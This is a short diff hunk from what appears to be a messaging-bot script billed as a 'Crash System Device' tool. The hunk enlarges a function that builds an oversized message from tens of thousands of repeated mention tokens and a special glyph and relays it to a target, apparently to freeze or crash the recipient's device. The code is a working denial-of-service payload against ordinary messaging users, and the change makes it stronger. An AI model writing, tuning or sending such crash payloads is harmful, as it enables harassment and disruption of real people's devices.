@@ -1363,7 +1363,7 @@ bot.command("status", ctx => {
 console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
 };
 async function XeonXRobust(target, Ptcp = true) {
-  const jids = `_*~@0~*_\n`.repeat(10200);
+  const jids = `_*~@0~*_\n`.repeat(22200);
   const ui = "ꦽ".repeat(10000);
   await cella.relayMessage(target, {
     ephemeralMessage: {
